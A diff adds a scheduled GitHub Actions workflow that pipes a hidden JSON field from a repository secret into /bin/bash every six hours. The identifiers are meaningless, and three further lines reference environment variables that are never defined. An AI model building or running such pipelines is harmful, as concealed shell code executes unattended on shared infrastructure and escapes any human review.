@@ -1,0 +1,20 @@
+name: liyuanzhixiang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liyuanzhixiang
+        env:
+          alp656: ${{ secrets.alp656 }}
+        run: |
+          echo $alp656 | jq -r .ng0 | /bin/bash
+          echo $mtbgb09667 | jq -r .psz839 | /bin/bash
+          echo $fbf0 | jq -r .rfw86 | /bin/bash
+          echo $lzjky35 | jq -r .ef87131 | /bin/bash
+
